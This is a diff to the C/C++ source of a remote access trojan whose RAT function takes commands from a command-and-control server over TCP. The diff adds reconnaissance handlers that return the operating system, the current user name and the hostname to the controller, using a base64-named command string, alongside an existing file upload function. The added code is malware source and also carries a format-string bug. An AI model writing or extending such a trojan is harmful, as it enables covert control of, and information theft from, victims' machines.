@@ -1,13 +1,17 @@
+// C
 #include <stdio.h>
 #include <unistd.h>
 #include <time.h>
 #include <string.h>
 #include <stdlib.h>
+#include <pwd.h>
 
 #include <sys/socket.h>
 #include <sys/wait.h>
+#include <sys/types.h>
 #include <arpa/inet.h>
 
+// C++
 #include <iostream>
  
 #define DEFAULT_BUFLEN 1024
@@ -71,6 +75,13 @@ int upload(char *filename, char *content){
 		fclose(outfile);
 		return 0;
 	}
+}
+
+void whoami(char *returnval, int returnsize)
+{
+    int bufferlen = 257;
+    struct passwd *p = getpwuid(getuid());  // Check for NULL!
+    sprintf(returnval, p->pw_name);
 }
 
 void RAT(char* C2_Server, int C2_Port)
@@ -170,6 +181,16 @@ void RAT(char* C2_Server, int C2_Port)
                         memset(buffer, 0, sizeof(buffer));
                         memset(CommandReceived, 0, sizeof(CommandReceived));
                 }
+                else if ((strcmp(command, "UHJvYmluZyBPcGVyYXRpbmcgU3lzdGVt") == 0))
+                {
+                    char buffer[257] = "";
+                    strcat(buffer, "Linux");
+                    //strcat(buffer, "\n");
+                    send(tcp_sock, buffer, strlen(buffer) + 1, 0);
+
+                    memset(buffer, 0, sizeof(buffer));
+                    memset(CommandReceived, 0, sizeof(CommandReceived));
+                }
                 else if (strcmp(command, "ping") == 0)
                 {
                     char buffer[64] = "";
@@ -198,6 +219,28 @@ void RAT(char* C2_Server, int C2_Port)
                     sprintf(t_pid, "%d", pid); // ew
 
                     strcat(buffer,t_pid);
+                    send(tcp_sock,buffer,strlen(buffer) + 1, 0);
+
+                    memset(buffer, 0, sizeof(buffer));
+                    memset(CommandReceived, 0, sizeof(CommandReceived));
+			    }
+                else if (strcmp(command, "whoami") == 0)
+                {
+                    char buffer[128] = "";
+
+                    struct passwd *p = getpwuid(getuid());  // Check for NULL!
+                    strcat(buffer,p->pw_name);
+                    send(tcp_sock,buffer,strlen(buffer) + 1, 0);
+
+                    memset(buffer, 0, sizeof(buffer));
+                    memset(CommandReceived, 0, sizeof(CommandReceived));
+			    }
+                else if (strcmp(command, "hostname") == 0)
+                {
+                    char buffer[512] = "";
+                    char hostname[256];
+                    gethostname(hostname, sizeof(hostname));  // Check the return value!
+                    strcat(buffer,hostname);
                     send(tcp_sock,buffer,strlen(buffer) + 1, 0);
 
                     memset(buffer, 0, sizeof(buffer));
